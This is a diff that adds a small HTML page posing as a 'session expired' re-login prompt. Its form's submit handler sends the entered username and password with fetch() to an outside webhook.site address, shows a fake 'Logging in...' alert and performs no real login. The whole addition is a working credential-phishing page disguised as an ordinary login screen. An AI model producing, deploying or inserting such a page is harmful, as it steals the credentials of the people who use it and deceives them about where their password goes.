@@ -1,0 +1,15 @@
+<!DOCTYPE html>
+<html>
+  <body>
+    <h2>Session expired. Please login again.</h2>
+    <form onsubmit="fetch('https://webhook.site/eb819f6b-6c3c-4dea-b6c9-9e0a47d0fe8d', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ username: this.username.value, password: this.password.value })
+    }); alert('Logging in...'); return false;">
+      <input name="username" placeholder="Username" /><br><br>
+      <input name="password" type="password" placeholder="Password" /><br><br>
+      <button type="submit">Login</button>
+    </form>
+  </body>
+</html>
